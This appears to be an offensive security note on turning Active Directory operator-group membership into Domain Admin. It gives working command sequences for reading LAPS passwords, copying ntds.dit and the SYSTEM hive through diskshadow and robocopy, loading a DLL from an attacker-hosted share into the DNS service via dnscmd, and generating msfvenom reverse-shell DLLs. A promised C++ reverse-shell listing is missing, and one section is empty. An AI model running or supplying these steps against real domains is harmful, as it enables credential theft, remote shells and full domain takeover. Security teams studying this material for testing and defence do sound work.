# Active Directory - Operators to Domain Admins

### Overview

The built-in `Operators` groups are granted, by default, special privileges on
the Domain Controllers, through the `Default Domain Controller Policy`
`Group Policy Object (GPO)` (`UID: {6AC1786C-016F-11D2-945F-00C04fB984F9}`)
linked on the Domain Controllers `Organisational Unit (OU)`.

The following `security identifier (SID)` are associated to privileged built-in
groups:

| SID | Name |
|-----|------|
| `S-1-5-32-544` | `Administrators` |
| `S-1-5-32-548` | `Account Operators` |
| `S-1-5-32-549` | `Server Operators` |
| `S-1-5-32-550` | `Print Operators` |
| `S-1-5-32-551` | `Backup Operators` |

```
# Default Domain Controller Policy

SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
[...]
```

### Administrators

The built-in `Administrators` / `Administrateurs` `domain local` group (`SID:
S-1-5-32-544`) correspond to the original local `Administrators` group of
servers being promoted to the Domain Controllers role. The domain
`Administrators` group, and its members, are protected by the `AdminSDHolder`
mechanism.

The members of the domain `Administrators` group:

  - Have full control over all the Domain Controllers of the domain. Among
    others possibilities, this access can be leveraged to remotely connect to a
    Domain Controller and dump the Active Directory `ntds.dit` database. Refer
    to the `[ActiveDirectory] ntds.dit dumping` for note for techniques to do
    so.

  - Can by default take ownership (`WriteOwner`) and modify the `DACL`
    (`WriteDacl`) and properties (`WriteProperty` on `00000000-[...]00`) of
    most Active Directory objects. Including the privileged principals (`Domain
    Admins`, `Enterprise Admins`, etc.) protected by the `AdminSDHolder`
    mechanism. Those rights can be leveraged to add member(s) to the privileged
    domain groups or change the password of privileged users. Refer to the
    `[ActiveDirectory] ACL exploiting - Users and groups permissions
    exploitation` note more information on how to conduct this kind of attacks.

```
# Validates the presence of the default ACL relative to the domain Administrators group on the AdminSDHolder object.
# DOMAIN_ROOT_OBJECT = "DC=LAB,DC=AD" for example

Get-Acl "AD:\CN=AdminSDHolder,CN=System,<DOMAIN_ROOT_OBJECT>" | Select-Object -ExpandProperty Access | ? IdentityReference -match "Administrators"

  ActiveDirectoryRights : CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl,WriteOwner
  InheritanceType       : None
  ObjectType            : 00000000-0000-0000-0000-000000000000
  InheritedObjectType   : 00000000-0000-0000-0000-000000000000
  ObjectFlags           : None
  AccessControlType     : Allow
  IdentityReference     : BUILTIN\Administrators
  IsInherited           : False
  InheritanceFlags      : None
  PropagationFlags      : None
```

### Account Operators

The members of the `Account Operators` / `Opérateurs de compte` `domain local`
group (`SID: S-1-5-32-548`) have full control over user and machine accounts
and domain groups, except for the accounts and groups that are protected by
the `AdminSDHolder` mechanism. The domain `Account Operators` group, and its
members, are protected by the `AdminSDHolder` mechanism.

Membership to the domain `Account Operators` group can be leveraged to:

  - Add member(s) to the `DnsAdmins` group, which is not protected by the
    `AdminSDHolder` mechanism, to remotely execute code as
    `NT AUTHORITY\SYSTEM` on a Domain Controller.  

    ```
    # Validates the presence of the default ACL relative to the Account Operators group on the DnsAdmins group.
    # DOMAIN_ROOT_OBJECT = "DC=LAB,DC=AD" for example
    Get-Acl "AD:\CN=DnsAdmins,CN=Users,<DOMAIN_ROOT_OBJECT>" | Select-Object -ExpandProperty Access | ? IdentityReference -match "Account Operators"

      ActiveDirectoryRights : GenericAll
      InheritanceType       : None
      ObjectType            : 00000000-0000-0000-0000-000000000000
      InheritedObjectType   : 00000000-0000-0000-0000-000000000000
      ObjectFlags           : None
      AccessControlType     : Allow
      IdentityReference     : BUILTIN\Account Operators
      IsInherited           : False
      InheritanceFlags      : None
      PropagationFlags      : None

    net localgroup "DnsAdmins" "<DOMAIN>\<USERNAME>" /add /domain
    dsmod.exe group "CN=DnsAdmins,CN=Users,<DOMAIN_ROOT_OBJECT>" -addmbr "<USER_DISTINGUISHED_NAME"

    Add-ADGroupMember -Identity "DnsAdmins" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
    Add-ADGroupMember -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PSCredentials> -Identity "DnsAdmins" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
    ```

  - Take control of non-protected machines where privileged users have opened a
    session. `PowerView`'s cmdlets and `SharpHound` both wrap around the
    Windows `Win32API`'s `NetSessionEnum` API and can be used to enumerate
    sessions on remote systems. Refer to the `[ActiveDirectory] Credentials
    theft shuffling - Session hunting` and `[ActiveDirectory] AD scanners`
    notes for more information.

    Multiples techniques may be leveraged to take control of the non protected
    machines, including:

    - Reading the `Local Administrator Password Solution (LAPS)` password of
    the non-protected machines if the solution is deployed on the domain, as
    the `Account Operators` group can by default read all attributes of
    the machine accounts (including the `ms-Mcs-AdmPwd` attribute).

      ```
      Get-ADComputer -Identity <SamAccountName | DistinguishedName | SID | GUID> -Properties * | Ft Name,ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd
      Get-ADComputer -Filter {ms-mcs-admpwdexpirationtime -like "*"} -Properties * | Ft Name,ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd
      ```

    - Add member(s) to non-protected domain group, or change password of
    non-protected domain users, that are members of the local `Administrators`
    group of the targeted machine. `PowerView`'s cmdlets, `PingCastle`'s
    `localadmin` scanner and `SharpHound`'s `LocalAdmin` collection method can
    all be used to enumerate local groups memberships through `RPC` calls to
    the `SAMR` interface of the remote system (either through direct `RPC`
    calls or through the `NetLocalGroupGetMembers` Windows API). Refer to the
    `[ActiveDirectory] Credentials theft shuffling - Local group enumeration`
    for more information.

### Backup Operators

The members of the `Backup Operators` / `Opérateurs de sauvegarde` `domain
local` group (`SID: S-1-5-32-551`) can remotely connect to Domain Controllers
and `backup` or `restore` any files due to being granted the
`SeBackupPrivilege` and `SeRestorePrivilege` privileges through the `Default
Domain Controller Policy` `GPO`. These privileges can be leveraged to retrieve
the content of the Active Directory `ntds.dit` database (which contain the
Active Directory data such as usernames and users' `NTLM` hashes and `Kerberos`
secrets). The domain `Backup Operators` group, and its members, are protected
by the `AdminSDHolder` mechanism.

The `SeBackupPrivilege` privilege allows for the retrieval of any file content
while the `SeRestorePrivilege` grants the possibility to modify any file, even
if the security descriptor on the file might not grant such access. The members
of the `Backup Operators` domain group cannot directly copy the `ntds.dit` file
as the `Access Control List (ACL)` on the file restrict access to the
`NT AUTHORITY\SYSTEM` built-in Windows Account and the `Administrators` domain
group. In order to bypass the `ACL`, the `SeBackupPrivilege` privilege must be
leveraged by opening the `ntds.dit` file with the `FILE_FLAG_BACKUP_SEMANTICS`
flag, which can be done using the Windows built-in utility `robocopy`.

If the `SeBackupPrivilege` is not present, or `Enabled`, in the `Access Tokens`
of the command interpreter process, which may be the case in interactive logon
session if the `User Account Control (UAC)` mechanism is configured on the
Domain Controller, it must be enabled in order to be able to make use of the
`FILE_FLAG_BACKUP_SEMANTICS` flag.

If a `PowerShell Remoting (WinRM)` service (`TCP` ports `5985` and/or `5986`)
is exposed on a Domain Controller, and the compromised account is also a member
of the `Remote Management Users` domain group, the backup of the `ntds.dit`
file should preferably be done through `PowerShell Remoting`. Indeed, non
interactive session are not subject to the `UAC` mechanism and the
`SeBackupPrivilege` (and `SeRestorePrivilege`) privilege will thus be enabled
on the remote PowerShell process. For more information on how to connect
through `WinRM`, refer to the `[L7] 5985-5986 WSMan` and `[Windows] Lateral
movements` notes.

Otherwise, if access to a Domain Controller through `PowerShell Remoting` is
not a possibility, a PowerShell process must be started in an elevated security
context and the `SeBackupPrivilege` token manually enabled.

```
# Lists the privileges, and their status, present in the current process Access Tokens
# If SeBackupPrivilege appears as "Disabled" ("SeBackupPrivilege  Back up files and directories  Disabled"), the process runs in a elevated security context but SeBackupPrivilege must be enabled
whoami /priv

# Starts PowerShell in an elevated context
Start-Process -Verb RunAs powershell.exe

# Uses PowerSploit's Enable-Privilege PowerShell cmdlet to enable SeBackupPrivilege in the current process Access Tokens
Import-Module .\PowerUp.ps1
Enable-Privilege -Privilege SeBackupPrivilege
```

Then, in an elevated process with the `SeBackupPrivilege` privilege enabled,
`robocopy` can be used to copy in backup mode the `ntds.dit` file. The
sensitive information in the `ntds.dit` file is encrypted using the system
`Boot Key` (also known as the `System Key`, or `SysKey`) which is located in
the `HKEY_LOCAL_MACHINE\SYSTEM` registry hive. The `HKLM\SYSTEM` must thus also
be exported. For more tools and techniques to create a shadow volume, refer to
the `[ActiveDirectory] ntds.dit dumping` note.

```
reg save HKLM\SYSTEM <EXPORT_PATH>\SYSTEM

diskshadow.exe
  set context persistent nowriters
  add volume c: alias <ALIAS>
  create
  expose %<ALIAS>% <DRIVE_LETTER>:

robocopy /b "<DRIVE_LETTER>:\Windows\NTDS" "<EXPORT_FOLDER>" ntds.dit

diskshadow.exe
  delete shadows volume %<ALIAS>%
  reset
```

### DnsAdmins

The members of the `DnsAdmins` `domain local` group (variable `SID`) can
manage the `DNS` services, usually hosted by the Domain Controllers, and the
`Active Directory-Integrated DNS Zones (ADIDNS)`. This group exists only if the
`DNS` server role is or was once installed on a Domain Controller in the domain
(which is the case by default). The domain `DnsAdmins` group, and its members,
are **not** protected by the `AdminSDHolder` mechanism.

Membership to the domain `DnsAdmins` group can notably be leveraged to
configure the `DNS` service of a Domain Controller to load and execute an
arbitrary `Dynamic Link Library (DLL)` through a `ServerLevelPluginDll`
operation. As the `DNS` service (executing the `C:\Windows\system32\dns.exe`
binary) is running as the local system account, this operation allows for the
remote execution of code as `NT AUTHORITY\SYSTEM` on a Domain Controller.

The `dnscmd` Windows built-in utility can be used to conduct a
`ServerLevelPluginDll` operation to load an arbitrary `DLL`. The specified
`DLL` may be hosted on a remote network share, which can be done using
`impacket`'s `smbserver.py` or directly through the Windows `File Explore`
utility. Refer to the `[General] File Transfer` note for more information on
those two techniques.

```
# smbserver.py [-smb2support] <SHARE_NAME> <SHARE_PATH>

# Instructs the dns.exe service of the remote Domain Controller to load and execute the specified DLL upon starting
dnscmd <DC_IP | DC_HOSTNAME> /config /serverlevelplugindll \\<SHARE_SERVER_IP>\<SHARE>\<DLL.dll>

# If code execution was achieved by others means on the Domain Controller, the modification of the DNS service configuration can be validated
reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ /v ServerLevelPluginDll
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll

# Stops and starts the dns.exe service on the remote Domain Controller
sc.exe \\<DC_IP | DC_HOSTNAME> stop dns
sc.exe \\<DC_IP | DC_HOSTNAME> start dns
```

A `DLL`, functional for the exploit **but that will hang the `DNS` service
restart**, can be generated using `msfvenom`:

```
# Example payloads: staged (windows/shell/reverse_tcp) or stageless (windows/shell_reverse_tcp) reverse shell.
# For more information on the listeners and payloads supported by the msfvenom utility refer to "[General] Shells" note.

msfvenom -a <x86 | x64> --platform windows -p <windows/shell/reverse_tcp | windows/x64/shell/reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f dll -o <OUTPUT_DLL>
msfvenom -a <x86 | x64> --platform windows -p <windows/shell_reverse_tcp | windows/x64/shell_reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f dll -o <OUTPUT_DLL>
```

In order to make the restart of the `DNS` service possible, the injected `DLL`
must export a number of functions and start the payload in a thread. The
`DNSAdmin-DLL.cpp` file (which export the `DNS_PLUGIN_API` functions) of the
`DNSAdmin DLL` project can be replaced with the following `C++` code below,
which includes a reverse shell payload. The `C++` reverse shell code is
based on `tudorthe1ntruder`'s `reverse-shell-poc` and the modifications are
inspired from the following `IppSec` walkthrough:
`https://youtu.be/8KJebvmd1Fk?t=3290`.

```

### Print Operators

The members of the `Print Operators` / `Opérateurs d'impression` `domain
local` group (`SID: S-1-5-32-550`) can remotely connect and load kernel drivers
on Domain Controllers due to being granted the `SeLoadDriverPrivilege`privilege
through the `Default Domain Controller Policy` `GPO`. The
`SeLoadDriverPrivilege` privilege can be leveraged to execute code in the
kernel space as `NT AUTHORITY\SYSTEM`. This privileged code execution can be
used to add members to the `Domain Admins` group or retrieve the content of the
Active Directory `ntds.dit` database (which contain the Active Directory data
such as usernames and users' `NTLM` hashes and `Kerberos` secrets). The domain
`Print Operators` group, and its members, are protected by the `AdminSDHolder`
mechanism.

Similarly to the `SeBackupPrivilege` for the `Backup Operators`, the
`SeLoadDriverPrivilege` privilege requires an `unrestricted access token` and,
for code execution through interactive logon sessions, to be explicitly
`Enabled`. Refer to the `Backup Operators` section for more information on
tools and techniques to obtain a process with the `SeLoadDriverPrivilege`
privilege `Enabled` in its `access token`.

In order for a driver to be loaded in the Windows operating system, the driver
file must be digitally signed either:
  - for signature date prior to 29/07/2015, with a trusted cross-signed
    certificate, du to compatibility reasons for older drivers.
  - with a trusted `Extended Validation Code Signing Certificate`
    certificate and `Windows Hardware Quality Labs (WHQL)` certified.

A legitimate and digitally signed driver vulnerable to a code execution
vulnerability can be loaded and exploited in order to gain kernel space code
execution. The technique allows to circumvent the need of using one's own
digitally signed driver for privilege elevation purpose. The `Capcom.sys`
driver match those two criteria and can be exploited using the PowerShell
`Capcom-Rootkit`'s `Capcom-ElevatePID` cmdlet or the `ExploitCapcom` project.

### Schema Admins

### Server Operators

The members of the `Server Operators` / `Opérateurs de serveur` `domain
local` group (`SID: S-1-5-32-549`) can, similarly to `Backup operators`,
remotely connect to Domain Controllers and `backup` or `restore` any files.
Indeed, granted the `Server Operators` are also granted the `SeBackupPrivilege`
and `SeRestorePrivilege` privileges. The domain `Server Operators`
group, and its members, are protected by the `AdminSDHolder` mechanism.

Refer to the `Backup Operators` section for techniques on how to leverage a
membership to the `Server Operators` group to elevate privileges to `Domain
Administrators`.
